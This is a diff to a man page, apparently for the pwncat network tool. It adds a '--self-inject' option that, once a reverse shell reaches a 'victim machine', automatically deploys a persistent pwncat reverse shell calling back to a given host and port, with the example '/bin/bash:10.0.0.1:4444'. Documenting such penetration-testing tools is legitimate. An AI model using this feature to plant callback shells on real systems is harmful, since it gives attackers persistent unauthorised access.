@@ -92,6 +92,20 @@ In 'auto' mode, color is displayed as long as the output
 goes to a terminal. If it is piped into a file, color
 will automatically be disabled. This mode also disables
 color on Windows by default. (default: auto)
+.SS "command & control arguments:"
+.TP
+\fB\-\-self\-inject\fR cmd:host:port
+Listen mode (TCP only):
+If you are about to inject a reverse shell onto the
+victim machine (via php, bash, nc, ncat or similar),
+start your listening server with this argument.
+This will then (as soon as the reverse shell connects)
+automatically deploy and background\-run an unbreakable
+pwncat reverse shell onto the victim machine which then
+also connects back to you with specified arguments.
+Example: '\-\-self\-inject /bin/bash:10.0.0.1:4444'
+Note: this is currently an experimental feature and does
+not work on Windows remote hosts yet.
 .SS "advanced arguments:"
 .TP
 \fB\-\-script\-send\fR file
